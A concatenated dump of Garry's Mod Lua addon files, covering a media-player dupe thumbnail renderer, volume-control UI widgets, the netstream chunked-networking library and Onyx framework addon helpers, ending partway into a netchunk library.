AddHTMLMaterialStyle( HTMLMAT_STYLE_DUPE, {
	width = 512,
	height = 512,
	css = [[
img {
	-webkit-filter: blur(6px) brightness(0.9);
	-webkit-transform: translate(-50%, -50%) scale(1.05, 1.05);
}]]
}, HTMLMAT_STYLE_COVER_IMG )

surface.CreateFont( "DupeMediaText", {
	font		= "Clear Sans Medium",
	antialias	= true,
	weight		= 400,
	size        = 80
} )

local function PreSaveMediaPlayerDupe( Dupe )

	local mediaplayers = {}

	for _, ent in pairs( Dupe.Entities or {} ) do
		if ent.IsMediaPlayerEntity then
			table.insert( mediaplayers, ent )
		end
	end

	local mp = mediaplayers[1]
	local snapshot = mp.MediaPlayerSnapshot

	local media = snapshot.media
	local metadata = media and media._metadata
	local thumbnail = metadata and metadata.thumbnail

	if thumbnail then
		HTMLMaterial( thumbnail, HTMLMAT_STYLE_DUPE, function( material )
			MEDIAPLAYER_THUMBNAIL = material
			MEDIAPLAYER_SAVE = true
		end )
	else
		MEDIAPLAYER_THUMBNAIL = Material( "gui/dupe_bg.png" )
		MEDIAPLAYER_SAVE = true
	end

end

local function DrawOutlinedText(text, font, x, y, colour, xalign, yalign)
	local outlineColor = Color(0,0,0,colour.a)
	draw.SimpleText(text, font, x, y + 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x + 1, y + 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x - 1, y + 2, outlineColor, xalign, yalign)

	draw.SimpleText(text, font, x, y - 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x + 1, y - 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x - 1, y - 2, outlineColor, xalign, yalign)

	draw.SimpleText(text, font, x + 2, y + 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x + 2, y + 1, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x + 2, y - 1, outlineColor, xalign, yalign)

	draw.SimpleText(text, font, x - 2, y + 2, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x - 2, y + 1, outlineColor, xalign, yalign)
	draw.SimpleText(text, font, x - 2, y - 1, outlineColor, xalign, yalign)

	draw.SimpleText(text, font, x, y, colour, xalign, yalign)
end

local function RenderMediaPlayerDupe( Dupe )

	local FOV = 17

	--
	-- This is gonna take some cunning to look awesome!
	--
	local Size		= Dupe.Maxs - Dupe.Mins;
	local Radius	= Size:Length() * 0.5;
	local CamDist	= Radius / math.sin( math.rad( FOV ) * 0.5 ) -- Works out how far the camera has to be away based on radius + fov!
	local Center	= LerpVector( 0.5, Dupe.Mins, Dupe.Maxs );
	local CamPos	= Center + Vector( -1, 0, 0.5 ):GetNormal() * CamDist;
	local EyeAng	= ( Center - CamPos ):GetNormal():Angle();

	--
	-- The base view
	--
	local view =
	{
		type		= "3D",
		origin		= CamPos,
		angles		= EyeAng,
		x			= 0,
		y			= 0,
		w			= 512,
		h			= 512,
		aspect		= 1,
		fov			= FOV
	}

	--
	-- Create a bunch of entities we're gonna use to render.
	--
	local entities = {}

	for k, v in pairs( Dupe.Entities ) do

		local ent

		if ( v.Class == "prop_ragdoll" ) then

			ent = ClientsideRagdoll( v.Model or "error.mdl", RENDERGROUP_OTHER )

			if ( istable( v.PhysicsObjects ) ) then

				for boneid, v in pairs( v.PhysicsObjects ) do

					local obj = ent:GetPhysicsObjectNum( boneid )
					if ( IsValid( obj ) ) then
						obj:SetPos( v.Pos )
						obj:SetAngles( v.Angle )
					end

				end

				ent:InvalidateBoneCache()

			end

		elseif v.IsMediaPlayerEntity then

			ent = ClientsideModel( v.Model or "error.mdl", RENDERGROUP_OTHER )
			ent.PlayerConfig = v.PlayerConfig

			local mp = MediaPlayer.GetById( v.DT.MediaPlayerID )
			if mp and mp:GetType() == "entity" then
				mp._oldent = mp.Entity
				mp.Entity = ent
			end

		end

		entities[k] = ent

	end


	--
	-- DRAW THE BACKGROUND
	--
	render.SetMaterial( Material( "gui/dupe_bg.png" ) )
	render.DrawScreenQuadEx( 0, 0, 512, 512 )

	render.SetMaterial( MEDIAPLAYER_THUMBNAIL )
	render.DrawScreenQuadEx( 0, 0, 512, 512 )
	render.SuppressEngineLighting( true )

	--
	-- BLACK OUTLINE
	-- AWESOME BRUTE FORCE METHOD
	--
	render.SuppressEngineLighting( true )

	local BorderSize	= CamDist * 0.004
	local Up			= EyeAng:Up() * BorderSize
	local Right			= EyeAng:Right() * BorderSize

	render.SetColorModulation( 1, 1, 1, 1 )
	render.MaterialOverride( Material( "models/debug/debugwhite" ) )

	-- Render each entity in a circle
	for k, v in pairs( Dupe.Entities ) do

		for i=0, math.pi*2, 0.2 do

			view.origin = CamPos + Up * math.sin( i ) + Right * math.cos( i )

			cam.Start( view )

				render.Model(
				{
					model	=	v.Model,
					pos		=	v.Pos,
					angle	=	v.Angle,

				}, entities[k] )

			cam.End()

		end

	end

	-- Because ee just messed up the depth
	render.ClearDepth()
	render.SetColorModulation( 0, 0, 0, 1 )

	-- Try to keep the border size consistent with zoom size
	local BorderSize	= CamDist * 0.002
	local Up			= EyeAng:Up() * BorderSize
	local Right			= EyeAng:Right() * BorderSize

	-- Render each entity in a circle
	for k, v in pairs( Dupe.Entities ) do

		for i=0, math.pi*2, 0.2 do

			view.origin = CamPos + Up * math.sin( i ) + Right * math.cos( i )
			cam.Start( view )

			render.Model(
			{
				model	=	v.Model,
				pos		=	v.Pos,
				angle	=	v.Angle,
				skin	=	v.Skin
			}, entities[k] )

			cam.End()

		end

	end

	--
	-- ACUAL RENDER!
	--

	-- We just fucked the depth up - so clean it
	render.ClearDepth()

	-- Set up the lighting. This is over-bright on purpose - to make the ents pop
	render.SetModelLighting( 0, 0, 0, 0 )
	render.SetModelLighting( 1, 2, 2, 2 )
	render.SetModelLighting( 2, 3, 2, 0 )
	render.SetModelLighting( 3, 0.5, 2.0, 2.5 )
	render.SetModelLighting( 4, 3, 3, 3 ) -- top
	render.SetModelLighting( 5, 0, 0, 0 )
	render.MaterialOverride( nil )

	view.origin = CamPos
	cam.Start( view )

	-- Render each model
	for k, v in pairs( Dupe.Entities ) do

		render.SetColorModulation( 1, 1, 1, 1 )

		if ( istable( v.EntityMods ) ) then

			if ( istable( v.EntityMods.colour ) ) then
				render.SetColorModulation( v.EntityMods.colour.Color.r/255, v.EntityMods.colour.Color.g/255, v.EntityMods.colour.Color.b/255, v.EntityMods.colour.Color.a/255 )
			end

			if ( istable( v.EntityMods.material ) ) then
				render.MaterialOverride( Material( v.EntityMods.material.MaterialOverride ) )
			end

		end

		local ent = entities[k]

		render.Model(
		{
			model	=	v.Model,
			pos		=	v.Pos,
			angle	=	v.Angle,
			skin	=	v.Skin
		}, ent )

		if v.IsMediaPlayerEntity then

			local mp = MediaPlayer.GetById( v.DT.MediaPlayerID )
			if mp then
				mp:Draw( true, false )
				mp.Entity = mp._oldent
			else
				local w, h, pos, ang = ent:GetMediaPlayerPosition()
				cam.Start3D2D( pos, ang, 1 )
					surface.SetDrawColor( color_white )
					surface.SetMaterial( Material( "theater/STATIC" ) )
					surface.DrawTexturedRect( 0, 0, w, h )
				cam.End3D2D()
			end

		end

		render.MaterialOverride( nil )

	end

	cam.End()

	-- Enable lighting again (or it will affect outside of this loop!)
	render.SuppressEngineLighting( false )
	render.SetColorModulation( 1, 1, 1, 1 )

	--
	-- Finished with the entities - remove them all
	--
	for k, v in pairs( entities ) do
		v:Remove()
	end

	--
	-- Media Player branding
	--
	cam.Start2D()
		DrawOutlinedText( "MEDIA PLAYER", "DupeMediaText", 512*0.5, 512 - 34,
			color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	cam.End2D()

	local jpegdata = render.Capture{
		format		=	"jpeg",
		x			=	0,
		y			=	0,
		w			=	512,
		h			=	512,
		quality		=	100
	}

	return jpegdata

end

local function SaveMediaPlayerDupe( Dupe, jpegdata )

	--
	-- Encode and compress the dupe
	--
	local Dupe = util.TableToJSON( Dupe )
	if ( !isstring( Dupe ) ) then
		Msg( "There was an error converting the dupe to a json string" );
	end

	Dupe = util.Compress( Dupe )

	--
	-- And save it! (filename is automatic md5 in dupes/)
	--
	if ( engine.WriteDupe( Dupe, jpegdata ) ) then

		-- Disable the save button!!
		hook.Run( "DupeSaveUnavailable" )
		hook.Run( "DupeSaved" )

		MsgN( "Saved!" )

		-- TODO: Open tab and show dupe!

	end

end

hook.Add( "PostRenderVGUI", "MediaPlayerDupe", function()

	if not g_ClientSaveDupe then return end
	local isMediaDupe = false

	for _, ent in pairs( g_ClientSaveDupe.Entities or {} ) do
		if ent.IsMediaPlayerEntity then
			isMediaDupe = true
			break
		end
	end

	if isMediaDupe then
		MEDIAPLAYER_DUPE = g_ClientSaveDupe
		g_ClientSaveDupe = nil

		PreSaveMediaPlayerDupe( MEDIAPLAYER_DUPE )
	end

end )

hook.Add( "PostRender", "MediaPlayerDupe", function()

	if not ( MEDIAPLAYER_DUPE and MEDIAPLAYER_SAVE ) then return end

	local jpeg = RenderMediaPlayerDupe( MEDIAPLAYER_DUPE )
	SaveMediaPlayerDupe( MEDIAPLAYER_DUPE, jpeg )

	MEDIAPLAYER_DUPE = nil
	MEDIAPLAYER_SAVE = false

end )


--PATH addons/media_player/lua/mp_menu/volume_control.lua:
local math = math
local ceil = math.ceil
local clamp = math.Clamp

local surface = surface
local color_white = color_white

local PANEL = {}

PANEL.Margin = 16
PANEL.ButtonWidth = 18
PANEL.ButtonSpacing = 8
PANEL.BackgroundColor = Color( 28, 100, 157 )

function PANEL:Init()

	self.BaseClass.Init( self )

	self.VolumeButton = vgui.Create( "MP.VolumeButton", self )

	self.VolumeSlider = vgui.Create( "MP.VolumeSlider", self )

	self.BtnList = vgui.Create( "DHorizontalList", self )
	self.BtnList:SetSpacing( self.ButtonSpacing )

	if hook.Run( MP.EVENTS.UI.PRIVILEGED_PLAYER ) then
		self.RepeatBtn = vgui.Create( "MP.RepeatButton" )
		self:AddButton( self.RepeatBtn )
		self.ShuffleBtn = vgui.Create( "MP.ShuffleButton" )
		self:AddButton( self.ShuffleBtn )
		self.LockBtn = vgui.Create( "MP.LockButton" )
		self:AddButton( self.LockBtn )
	end

	self:OnVolumeChanged( MediaPlayer.Volume() )

	hook.Add( MP.EVENTS.VOLUME_CHANGED, self, self.OnVolumeChanged )
	hook.Add( MP.EVENTS.UI.MEDIA_PLAYER_CHANGED, self, self.OnMediaPlayerChanged )

end

function PANEL:AddButton( panel )
	self.BtnList:AddItem( panel )
end

function PANEL:OnVolumeChanged( volume )

	self.VolumeSlider:SetSlideX( volume )

	self:InvalidateChildren()

end

function PANEL:OnMediaPlayerChanged( mp )

	if hook.Run( MP.EVENTS.UI.PRIVILEGED_PLAYER ) then
		self.RepeatBtn:SetEnabled( mp:GetQueueRepeat() )
		self.ShuffleBtn:SetEnabled( mp:GetQueueShuffle() )
		self.LockBtn:SetEnabled( mp:GetQueueLocked() )
	end

end

function PANEL:Paint( w, h )

	surface.SetDrawColor( self.BackgroundColor )
	surface.DrawRect( 0, 0, w, h )

end

function PANEL:PerformLayout( w, h )

	self.BtnList:InvalidateLayout( true )
	self.BtnList:CenterVertical()
	self.BtnList:AlignRight( self.Margin )

	self.VolumeButton:CenterVertical()
	self.VolumeButton:AlignLeft( self.Margin )

	local sliderWidth = ( self.BtnList:GetPos() - 15 ) -
			( self.VolumeButton:GetPos() + self.VolumeButton:GetWide() + 15 )
	self.VolumeSlider:SetWide( sliderWidth )
	self.VolumeSlider:CenterVertical()
	self.VolumeSlider:MoveRightOf( self.VolumeButton, 15 )

end

function PANEL:OnRemove()

	hook.Remove( MP.EVENTS.VOLUME_CHANGED, self )

end

derma.DefineControl( "MP.VolumeControl", "", PANEL, "DPanel" )


local VOLUME_BUTTON = {}

function VOLUME_BUTTON:Init()

	self.BaseClass.Init( self )

	self:SetIcon( 'mp-volume' )
	self:SetSize( 18, 17 )

end

function VOLUME_BUTTON:DoClick()

	MediaPlayer.ToggleMute()

end

derma.DefineControl( "MP.VolumeButton", "", VOLUME_BUTTON, "MP.SidebarButton" )


local VOLUME_SLIDER = {}

VOLUME_SLIDER.BarHeight = 3
VOLUME_SLIDER.KnobSize = 12

VOLUME_SLIDER.BarBgColor = Color( 13, 41, 62 )

VOLUME_SLIDER.ScrollIncrement = 0.1 -- out of 1

function VOLUME_SLIDER:Init()

	self.BaseClass.Init( self )

	self.Knob:SetSize( self.KnobSize, self.KnobSize )
	self.Knob.Paint = self.PaintKnob

	-- Remove some hidden panel child from the inherited DSlider control; I have
	-- no idea where it's being created...
	for _, child in pairs( self:GetChildren() ) do
		if child ~= self.Knob then
			child:Remove()
		end
	end

end

function VOLUME_SLIDER:Paint( w, h )

	local progress = self.m_fSlideX
	local vmid = ceil((h * 0.5) - (self.BarHeight * 0.5))

	surface.SetDrawColor( self.BarBgColor )
	surface.DrawRect( 0, vmid, w, self.BarHeight )

	surface.SetDrawColor( color_white )
	surface.DrawRect( 0, vmid, ceil(w * progress), self.BarHeight )

end

function VOLUME_SLIDER:PaintKnob( w, h )

	draw.RoundedBoxEx( ceil(w*0.5), 0, 0, w, h, color_white, true, true, true, true )

end

function VOLUME_SLIDER:SetSlideX( value )

	if self._lockVolume then return end

	value = clamp(value, 0, 1)

	self.m_fSlideX = value
	self:InvalidateLayout()

	self._lockVolume = true
	MediaPlayer.Volume( value )
	self._lockVolume = nil

end

function VOLUME_SLIDER:OnMouseWheeled( delta )

	local change = self.ScrollIncrement * delta
	local value = clamp(self.m_fSlideX + change, 0, 1)

	self:SetSlideX( value )

end

derma.DefineControl( "MP.VolumeSlider", "", VOLUME_SLIDER, "DSlider" )


local REPEAT_BTN = {}

function REPEAT_BTN:Init()
	self.BaseClass.Init( self )
	self:SetIcon( "mp-repeat" )
	self:SetTooltip( "Repeat" )
end

function REPEAT_BTN:DoClick()
	self.BaseClass.DoClick( self )
	hook.Run( MP.EVENTS.UI.TOGGLE_REPEAT )
end

derma.DefineControl( "MP.RepeatButton", "", REPEAT_BTN, "MP.SidebarToggleButton" )


local SHUFFLE_BTN = {}

function SHUFFLE_BTN:Init()
	self.BaseClass.Init( self )
	self:SetIcon( "mp-shuffle" )
	self:SetTooltip( "Shuffle" )
end

function SHUFFLE_BTN:DoClick()
	self.BaseClass.DoClick( self )
	hook.Run( MP.EVENTS.UI.TOGGLE_SHUFFLE )
end

derma.DefineControl( "MP.ShuffleButton", "", SHUFFLE_BTN, "MP.SidebarToggleButton" )


local LOCK_BTN = {}

function LOCK_BTN:Init()
	self.BaseClass.Init( self )
	self:SetIcon( "mp-lock-open" )
	self:SetTooltip( "Toggle Queue Lock" )
end

function LOCK_BTN:DoClick()
	self.BaseClass.DoClick( self )

	hook.Run( MP.EVENTS.UI.TOGGLE_LOCK )
	self:UpdateIcon()
end

function LOCK_BTN:SetEnabled( bEnabled )
	self.BaseClass.SetEnabled( self, bEnabled )
	self:UpdateIcon()
end

function LOCK_BTN:UpdateIcon()
	local icon = self:GetEnabled() and "mp-lock" or "mp-lock-open"
	self:SetIcon( icon )
end

derma.DefineControl( "MP.LockButton", "", LOCK_BTN, "MP.SidebarToggleButton" )

--PATH addons/__advdupe2/lua/autorun/netstream.lua:
--A net extension which allows sending large streams of data without overflowing the reliable channel
--Keep it in lua/autorun so it will be shared between addons
AddCSLuaFile()

net.Stream = {}
net.Stream.SendSize = 20000 --This is the size of each packet to send
net.Stream.Timeout = 30 --How long to wait for client response before cleaning up
net.Stream.MaxWriteStreams = 1024 --The maximum number of write data items to store
net.Stream.MaxReadStreams = 128 --The maximum number of queued read data items to store
net.Stream.MaxChunks = 3200 --Maximum number of pieces the stream can send to the server. 64 MB
net.Stream.MaxSize = net.Stream.SendSize*net.Stream.MaxChunks
net.Stream.MaxTries = 3 --Maximum times the client may retry downloading the whole data

local WriteStreamQueue = {
	__index = {
		Add = function(self, stream)
			local identifier = self.curidentifier
			local startid = identifier
			while self.queue[identifier] do
				identifier = identifier % net.Stream.MaxWriteStreams + 1
				if identifier == startid then
					ErrorNoHalt("Netstream is full of WriteStreams!")
					net.WriteUInt(0, 32)
					return
				end
			end
			self.curidentifier = identifier % net.Stream.MaxWriteStreams + 1

			if next(self.queue)==nil then
				self.activitytimeout = CurTime()+net.Stream.Timeout
				timer.Create("netstream_queueclean", 5, 0, function() self:Clean() end)
			end
			self.queue[identifier] = stream
			stream.identifier = identifier
			return stream
		end,

		Write = function(self, ply)
			local identifier = net.ReadUInt(32)
			local chunkidx = net.ReadUInt(32)
			local stream = self.queue[identifier]
			--print("Got request", identifier, chunkidx, stream)
			if stream then
				if stream:Write(ply, chunkidx) then
					self.activitytimeout = CurTime()+net.Stream.Timeout
					stream.timeout = CurTime()+net.Stream.Timeout
				end
			else
				-- Tell them the stream doesn't exist
				net.Start("NetStreamRead")
				net.WriteUInt(identifier, 32)
				net.WriteUInt(0, 32)
				if SERVER then net.Send(ply) else net.SendToServer() end
			end
		end,

		Clean = function(self)
			local t = CurTime()
			for k, stream in pairs(self.queue) do
				if (next(stream.clients)~=nil and t >= stream.timeout) or t >= self.activitytimeout then
					stream:Remove()
					self.queue[k] = nil
				end
			end
			if next(self.queue)==nil then
				timer.Remove("netstream_queueclean")
			end
		end,
	},
	__call = function(t)
		return setmetatable({
			activitytimeout = CurTime()+net.Stream.Timeout,
			curidentifier = 1,
			queue = {}
		}, t)
	end
}
setmetatable(WriteStreamQueue, WriteStreamQueue)
net.Stream.WriteStreams = WriteStreamQueue()

local ReadStreamQueue = {
	__index = {
		Add = function(self, stream)
			local queue = self.queues[stream.player]

			if #queue == net.Stream.MaxReadStreams then
				ErrorNoHalt("Receiving too many ReadStream requests!")
				return
			end
			
			for _, v in ipairs(queue) do
				if v.identifier == stream.identifier then
					ErrorNoHalt("Tried to start a new ReadStream for an already existing stream!")
					return
				end
			end

			queue[#queue+1] = stream
			if #queue == 1 then
				stream:Request()
			end
			return stream
		end,

		Remove = function(self, stream)
			local queue = rawget(self.queues, stream.player)
			if queue then
				if stream == queue[1] then
					table.remove(queue, 1)
					local nextInQueue = queue[1]
					if nextInQueue then
						nextInQueue:Request()
					else
						self.queues[stream.player] = nil
					end
				else
					for k, v in ipairs(queue) do
						if v == stream then
							table.remove(queue, k)
							break
						end
					end
				end
			end
		end,

		Read = function(self, ply)
			local identifier = net.ReadUInt(32)
			local queue = rawget(self.queues, ply)
			if queue and queue[1] then
				queue[1]:Read(identifier)
			end
		end
	},
	__call = function(t)
		return setmetatable({
			queues = setmetatable({}, {__index = function(t,k) local r={} t[k]=r return r end})
		}, t)
	end
}
setmetatable(ReadStreamQueue, ReadStreamQueue)
net.Stream.ReadStreams = ReadStreamQueue()


local WritingDataItem = {
	__index = {
		Write = function(self, ply, chunkidx)
			local client = self.clients[ply]
			if client.finished then return false end
			if chunkidx == #self.chunks+1 then self:Finished(ply) return true end

			if client.downloads+#self.chunks-client.progress >= net.Stream.MaxTries * #self.chunks then self:Finished(ply) return false end
			client.downloads = client.downloads + 1

			local chunk = self.chunks[chunkidx]
			if not chunk then return false end

			client.progress = chunkidx

			--print("Sending", "NetStreamRead", self.identifier, #chunk.data, chunkidx, chunk.crc)
			net.Start("NetStreamRead")
			net.WriteUInt(self.identifier, 32)
			net.WriteUInt(#chunk.data, 32)
			net.WriteUInt(chunkidx, 32)
			net.WriteString(chunk.crc)
			net.WriteData(chunk.data, #chunk.data)
			if CLIENT then net.SendToServer() else net.Send(ply) end
			return true
		end,

		Finished = function(self, ply)
			self.clients[ply].finished = true
			if self.callback then
				local ok, err = xpcall(self.callback, debug.traceback, ply)
				if not ok then ErrorNoHalt(err) end
			end
		end,

		GetProgress = function(self, ply)
			return self.clients[ply].progress / #self.chunks
		end,

		Remove = function(self)
			local sendTo = {}
			for ply, client in pairs(self.clients) do
				if not client.finished then
					client.finished = true
					if CLIENT or ply:IsValid() then sendTo[#sendTo+1] = ply end
				end
			end

			if next(sendTo)~=nil then
				--print("Sending", "NetStreamRead", self.identifier, 0)
				net.Start("NetStreamRead")
				net.WriteUInt(self.identifier, 32)
				net.WriteUInt(0, 32)
				if SERVER then net.Send(sendTo) else net.SendToServer() end
			end
		end

	},
	__call = function(t, data, callback)
		local chunks = {}
		for i=1, math.ceil(#data / net.Stream.SendSize) do
			local datachunk = string.sub(data, (i - 1) * net.Stream.SendSize + 1, i * net.Stream.SendSize)
			chunks[i] = { data = datachunk, crc = util.CRC(datachunk) }
		end

		return setmetatable({
			timeout = CurTime()+net.Stream.Timeout,
			chunks = chunks,
			callback = callback,
			lasttouched = 0,
			clients = setmetatable({},{__index = function(t,k)
				local r = {
					finished = false,
					downloads = 0,
					progress = 0,
				} t[k]=r return r
			end})
		}, t)
	end
}
setmetatable(WritingDataItem, WritingDataItem)

local ReadingDataItem = {
	__index = {
		Request = function(self)
			if self.downloads+self.numchunks-#self.chunks >= net.Stream.MaxTries*self.numchunks then self:Remove() return end
			self.downloads = self.downloads + 1
			timer.Create("NetStreamReadTimeout" .. self.identifier, net.Stream.Timeout*0.5, 1, function() self:Request() end)
			self:WriteRequest()
		end,

		WriteRequest = function(self)
			--print("Requesting", self.identifier, #self.chunks)
			net.Start("NetStreamWrite")
			net.WriteUInt(self.identifier, 32)
			net.WriteUInt(#self.chunks+1, 32)
			if CLIENT then net.SendToServer() else net.Send(self.player) end
		end,

		Read = function(self, identifier)
			if self.identifier ~= identifier then self:Request() return end

			local size = net.ReadUInt(32)
			if size == 0 then self:Remove() return end

			local chunkidx = net.ReadUInt(32)
			if chunkidx ~= #self.chunks+1 then self:Request() return end

			local crc = net.ReadString()
			local data = net.ReadData(size)

			if crc ~= util.CRC(data) then self:Request() return end

			self.chunks[chunkidx] = data
			if #self.chunks == self.numchunks then self:Remove(true) return end

			self:Request()
		end,

		GetProgress = function(self)
			return #self.chunks/self.numchunks
		end,

		Remove = function(self, finished)
			timer.Remove("NetStreamReadTimeout" .. self.identifier)

			local data
			if finished then
				data = table.concat(self.chunks)
				if self.compressed then
					data = util.Decompress(data, net.Stream.MaxSize)
				end
				self:WriteRequest() -- Notify we finished
			end

			local ok, err = xpcall(self.callback, debug.traceback, data)
			if not ok then ErrorNoHalt(err) end

			net.Stream.ReadStreams:Remove(self)
		end
	},
	__call = function(t, ply, callback, numchunks, identifier, compressed)
		return setmetatable({
			identifier = identifier,
			chunks = {},
			compressed = compressed,
			numchunks = numchunks,
			callback = callback,
			player = ply,
			downloads = 0
		}, t)
	end
}
setmetatable(ReadingDataItem, ReadingDataItem)


function net.WriteStream(data, callback, dontcompress)
	if not isstring(data) then
		error("bad argument #1 to 'WriteStream' (string expected, got " .. type(data) .. ")", 2)
	end
	if callback ~= nil and not isfunction(callback) then
		error("bad argument #2 to 'WriteStream' (function expected, got " .. type(callback) .. ")", 2)
	end

	local compressed = not dontcompress
	if compressed then
		data = util.Compress(data) or ""
	end

	if #data == 0 then
		net.WriteUInt(0, 32)
		return
	end

	if #data > net.Stream.MaxSize then
		ErrorNoHalt("net.WriteStream request is too large! ", #data/1048576, "MiB")
		net.WriteUInt(0, 32)
		return
	end

	local stream = net.Stream.WriteStreams:Add(WritingDataItem(data, callback, compressed))
	if not stream then return end
	
	--print("WriteStream", #stream.chunks, stream.identifier, compressed)
	net.WriteUInt(#stream.chunks, 32)
	net.WriteUInt(stream.identifier, 32)
	net.WriteBool(compressed)

	return stream
end

--If the receiver is a player then add it to a queue.
--If the receiver is the server then add it to a queue for each individual player
function net.ReadStream(ply, callback)
	if CLIENT then
		ply = NULL
	else
		if type(ply) ~= "Player" then
			error("bad argument #1 to 'ReadStream' (Player expected, got " .. type(ply) .. ")", 2)
		elseif not ply:IsValid() then
			error("bad argument #1 to 'ReadStream' (Tried to use a NULL entity!)", 2)
		end
	end
	if not isfunction(callback) then
		error("bad argument #2 to 'ReadStream' (function expected, got " .. type(callback) .. ")", 2)
	end
	
	local numchunks = net.ReadUInt(32)
	if numchunks == nil then
		return
	elseif numchunks == 0 then
		local ok, err = xpcall(callback, debug.traceback, "")
		if not ok then ErrorNoHalt(err) end
		return
	end

	local identifier = net.ReadUInt(32)
	local compressed = net.ReadBool()

	if numchunks > net.Stream.MaxChunks then
		ErrorNoHalt("ReadStream requests from ", ply, " is too large! ", numchunks * net.Stream.SendSize / 1048576, "MiB")
		return
	end

	--print("ReadStream", numchunks, identifier, compressed)

	return net.Stream.ReadStreams:Add(ReadingDataItem(ply, callback, numchunks, identifier, compressed))
end

if SERVER then
	util.AddNetworkString("NetStreamWrite")
	util.AddNetworkString("NetStreamRead")
end

--Send requested stream data
net.Receive("NetStreamWrite", function(len, ply)
	net.Stream.WriteStreams:Write(ply or NULL)
end)

--Download the sent stream data
net.Receive("NetStreamRead", function(len, ply)
	net.Stream.ReadStreams:Read(ply or NULL)
end)

--PATH addons/____onyx_framework_2/lua/onyx/framework/libs/sh_addon.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

03/05/2023

--]]

local ADDON = {}
ADDON.__index = ADDON

function ADDON:RegisterOption(id, data)
    data.addon = self.id

    if (SERVER) then
        data.onSet = function(value)
            self.db:Queue([[REPLACE INTO `onyx_]] .. self.id .. [[_settings` VALUES(']] .. self.db:Escape(id) .. [[', ']] .. self.db:Escape(onyx.TypeToString(value)) .. [[');]])
        end
    end

    onyx.inconfig:Register(self.id .. '_' .. id, data)
end

function ADDON:GetOptionValue(id)
    return onyx.inconfig:Get(self.id .. '_' .. id)
end

if (SERVER) then
    function ADDON:SetupDatabase(mysqlEnabled, credentials)
        local moduleName = 'sqlite'
        local data = {}

        if (mysqlEnabled) then
            moduleName = 'mysqloo'
            data = {
                hostname = credentials.Hostname,
                username = credentials.Username,
                password = credentials.Password,
                database = credentials.Schema,
                port = credentials.Port,
            }
        end

        if (self.db and self.db:IsConnected()) then
            self.db:Log('Connection recycled.')
        else
            self.db = onyx.sql.Create(moduleName, self.id, data)
        end

        self:CreateSettingsTable()
        self:LoadSettings()

        hook.Run('onyx.' .. self.id .. '.DatabaseInit')
    end

    function ADDON:CreateSettingsTable()
        local id = self.id

        local q = self.db:Create('onyx_' .. id .. '_settings')
            q:Create('id', 'VARCHAR(64) NOT NULL')
            q:Create('value', 'VARCHAR(255) NOT NULL')
            q:PrimaryKey('id')
        q:Execute()
    end

    function ADDON:LoadSettings()
        local addonID = self.id
        onyx.WaitForGamemode('onyx.' .. addonID .. '.LoadSettings', function()
            local q = self.db:Select('onyx_' .. addonID .. '_settings')
                q:Callback(function(result)

                    self:Print('Loaded settings.')
                    if (result and #result > 0) then
                        for _, row in ipairs(result) do
                            local optionID = addonID .. '_' .. row.id
                            local value = onyx.StringToType(row.value)

                            onyx.inconfig.values[optionID] = value
                        end
                    end

                end)
            q:Execute()
        end)
    end
end

do
    local accent = Color(174, 0, 255)
    local accent2 = Color(38, 185, 160)
    local white = color_white
    local red = Color(255, 73, 73)
    local green = Color(121, 255, 68)
    local orange = Color(255, 180, 68)

    local function format(text, ...)
        for _, arg in ipairs({...}) do
            if isentity(arg) and arg:IsPlayer() then
                arg = arg:Name() .. ' (' .. arg:SteamID() .. ')'
            else
                arg = tostring(arg)
            end

            text = string.gsub(text, '#', arg, 1)
        end

        return text
    end

    local function printWPrefix(id, color, prefix, text, ...)
        MsgC(
            white, '(', accent, 'ONYX', white, ') ',
            white, '(', accent2, id, white, ') ',
            white, '(', color, prefix, white, ') ',
            format(text, ...),
            '\n'
        )
    end

    function ADDON:Print(text, ...)
        local id = string.upper(self.id)
        MsgC(
            white, '(', accent, 'ONYX', white, ') ',
            white, '(', accent2, id, white, ') ',
            format(text, ...),
            '\n'
        )
    end

    function ADDON:PrintError(text, ...)
        local id = string.upper(self.id)
        printWPrefix(id, red, 'ERROR', text, ...)
    end

    function ADDON:PrintWarning(text, ...)
        local id = string.upper(self.id)
        printWPrefix(id, orange, 'WARNING', text, ...)
    end

    function ADDON:PrintSuccess(text, ...)
        local id = string.upper(self.id)
        printWPrefix(id, green, 'SUCCESS', text, ...)
    end

    function ADDON:PrintDebug(...)
        onyx:PrintDebug(...)
    end
end

--[[------------------------------
Public function
--------------------------------]]

function onyx:Addon(id, data)
    assert(isstring(id), Format('bad argument #1 (expected string, got %s)', type(id)))
    assert(istable(data), Format('bad argument #2 (expected table, got %s)', type(data)))

    if (self[id] == nil) then
        data.id = id

        self[id] = setmetatable(data, ADDON)
        self[id]:Print('Initialized.')
    else
        self[id]:Print('Refreshing.')
    end

    return self[id]
end
--PATH addons/____onyx_framework_2/lua/onyx/framework/libs/sh_netchunk.lua:
--[[
MIT License

Copyright (c) 2023 Aleksandrs Filipovskis

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
--]]

if (netchunk) then return end

netchunk = netchunk or {}
netchunk.chunks = netchunk.chunks or {}
netchunk.registered = netchunk.registered or {}
-- netchunk.maxBytes = 32768
netchunk.maxBytes = 16384

local split do
    local len = string.len
    local sub = string.sub
